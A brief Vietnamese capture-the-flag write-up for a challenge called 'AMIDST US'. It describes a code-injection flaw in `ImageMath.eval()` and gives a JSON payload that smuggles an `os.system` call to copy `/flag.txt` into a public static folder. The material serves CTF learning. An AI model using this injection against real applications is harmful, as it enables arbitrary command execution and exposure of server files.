# AMIDST US

Vul ở `ImageMath.eval()`, ta lợi dụng để khai thác code injection. Mặc dù server trả về `400 BAD REQUEST` nhưng đoạn code inject vẫn sẽ được thực thi. Ghi kết quả ra thư mục mà ta có thể truy cập được -> `/static`

Payload:


```json
{"background": [1, 181, "__import__('os').system('cat /flag.txt > /app/application/static/flag')"], 
"image":"iVBORw0KGgoAAAANSUhEUgAABngAAAIKCAYAAAAApEFyAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAAEnQAABJ0Ad5mH3gAAGOgSURBVHhe7d3vl1x1nej7"}
```

